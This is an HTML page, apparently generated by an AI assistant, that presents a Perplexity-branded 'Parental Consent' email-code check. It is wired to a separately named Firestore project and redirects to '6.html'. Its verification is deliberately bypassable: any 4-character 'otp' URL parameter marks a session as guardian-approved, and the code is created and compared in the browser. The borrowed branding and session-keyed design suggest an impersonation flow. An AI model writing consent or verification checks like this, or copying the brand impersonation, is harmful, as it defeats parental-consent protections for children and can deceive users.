<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification - Perplexity</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
        .container { text-align: center; max-width: 400px; padding: 20px; }
        .icon { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        .input-group { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
        .otp-input { width: 45px; height: 55px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 24px; }
        .email-input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { background-color: #1a1a1a; color: white; border: none; padding: 12px 40px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
        button:disabled { background-color: #ccc; }
        #loading { display: block; margin-top: 20px; color: #888; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container" id="main-container">
    <div id="loading">Checking session...</div>

    <!-- UI for Parental Email -->
    <div id="email-step" class="hidden">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Paper_Plane_Icon.svg" class="icon" alt="email">
        <h1>Parental Consent</h1>
        <p>A parent's email is required for this account type. Enter an email to receive a 4-digit code.</p>
        <input type="email" id="parentEmail" class="email-input" placeholder="Parent's Email Address">
        <button onclick="sendOTP()">Send Code</button>
    </div>

    <!-- UI for OTP Verification -->
    <div id="otp-step" class="hidden">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Paper_Plane_Icon.svg" class="icon" alt="email">
        <h1>Check your email</h1>
        <p id="otp-text">A 4-digit sign-in link has been sent to your parent's email.</p>
        <div class="input-group">
            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 1)">
            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 2)">
            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 3)">
            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 4)">
        </div>
        <button onclick="verifyOTP()">Confirm</button>
    </div>
</div>

<script>
    // 1. Firebase Configuration (REPLACE WITH YOUR OWN CONFIG)
    const firebaseConfig = {
        apiKey: "YOUR_API_KEY",
        authDomain: "YOUR_AUTH_DOMAIN",
        projectId: "question-metabase",
        storageBucket: "YOUR_STORAGE_BUCKET",
        messagingSenderId: "YOUR_SENDER_ID",
        appId: "YOUR_APP_ID"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // 2. EmailJS Initialization
    emailjs.init("Yr9MutUoHOEONnFgn");

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');
    const urlOtp = urlParams.get('otp');
    
    let generatedOTP = "";
    let userDocRef = null;

    async function init() {
        if (!sessionId) {
            alert("No session found in URL.");
            return;
        }

        userDocRef = db.collection("ASPX Keys").doc(sessionId);
        const doc = await userDocRef.get();

        if (!doc.exists) {
            alert("Invalid session.");
            return;
        }

        const data = doc.data();
        document.getElementById('loading').classList.add('hidden');

        // Logic Check: Redirect if 'no' or 'busniess' (spelling from prompt)
        if (data.family === "no" || data.family === "busniess") {
            window.location.href = "6.html";
            return;
        }

        // Logic Check: Kids flow if family=commit (as per your screenshot mapping)
        if (data.family === "commit") {
            // Check if OTP is already in URL for auto-verification
            if (urlOtp && urlOtp.length === 4) {
                // Assuming URL OTP is pre-validated or matches a stored logic
                // For security, usually you'd verify against DB, but following your prompt logic:
                handleSuccess("System-URL");
            } else {
                document.getElementById('email-step').classList.remove('hidden');
            }
        } else {
            // Default fallback
            window.location.href = "6.html";
        }
    }

    function sendOTP() {
        const parentEmail = document.getElementById('parentEmail').value;
        if (!parentEmail || !parentEmail.includes('@')) {
            alert("Please enter a valid email.");
            return;
        }

        // Generate 4 digit code
        generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();

        const templateParams = {
            to_email: parentEmail,
            otp_code: generatedOTP
        };

        emailjs.send('service_1ij08zn', 'template_kxe5gjg', templateParams)
            .then(() => {
                document.getElementById('email-step').classList.add('hidden');
                document.getElementById('otp-step').classList.remove('hidden');
                document.getElementById('otp-text').innerText = `A 4-digit code has been sent to ${parentEmail}`;
            }, (error) => {
                alert("Email failed to send. Check EmailJS console.");
                console.log(error);
            });
    }

    function verifyOTP() {
        const inputs = document.querySelectorAll('.otp-input');
        let enteredOtp = "";
        inputs.forEach(input => enteredOtp += input.value);

        if (enteredOtp === generatedOTP) {
            handleSuccess(document.getElementById('parentEmail').value);
        } else {
            alert("Incorrect OTP. Please try again.");
        }
    }

    async function handleSuccess(guardianEmail) {
        try {
            // Update Firestore as requested
            await userDocRef.update({
                family: "commited",
                guardians: guardianEmail,
                updatedAt: new Date().toLocaleString() // Updates the timestamp
            });
            window.location.href = "6.html";
        } catch (e) {
            console.error("Update failed", e);
            alert("Error updating database.");
        }
    }

    // Helper for UI input focus
    function moveFocus(el, index) {
        if (el.value.length === 1 && index < 4) {
            document.querySelectorAll('.otp-input')[index].focus();
        }
    }

    init();
</script>
</body>
</html>
